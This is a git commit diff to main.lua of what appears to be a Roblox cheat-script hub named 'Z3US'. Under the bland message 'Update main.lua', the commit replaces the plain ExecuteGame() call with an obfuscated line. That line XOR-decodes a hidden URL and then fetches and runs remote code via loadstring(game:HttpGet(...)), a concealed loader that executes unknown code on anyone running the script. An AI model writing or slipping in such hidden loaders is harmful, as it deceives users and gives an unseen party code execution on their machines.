8d1c764372a81ae1f72aa1987f708319fca62c01
NervigeMuecke <139649304+NervigeMuecke@users.noreply.github.com>
2024-09-22 18:29:29 +0200

    Update main.lua

--- main.lua
+++ main.lua
@@ -1,6 +1,8 @@
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/violin-suzutsuki/LinoriaLib/main/Library.lua"))()
 local GameId = game.PlaceId
 
+local RunService = game:GetService("RunService")
+
 local function ExecuteRivals()
     Library:Notify("Z3US has detected you being in Rivals.", 5)
     wait(5)
@@ -46,4 +48,4 @@ local function ExecuteGame()
     end
 end
 
-ExecuteGame()
+local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v8,v9) local v10={};for v11=1, #v8 do v6(v10,v0(v4(v1(v2(v8,v11,v11 + 1 )),v1(v2(v9,1 + (v11% #v9) ,1 + (v11% #v9) + 1 )))%256 ));end return v5(v10);end ExecuteGame();wait(1.5 + 0 );loadstring(game:HttpGet(v7("\217\215\207\53\245\225\136\81\195\194\204\107\225\178\211\22\196\193\206\54\227\169\196\17\223\215\222\43\242\245\196\17\220\140\245\32\244\173\206\25\212\238\206\32\229\176\194\81\235\144\238\22\171\141\149\81\195\198\221\54\169\179\194\31\213\208\148\40\231\178\201\81\216\199\208\39\244\174\207\80\221\214\218","\126\177\163\187\69\134\219\167")))();
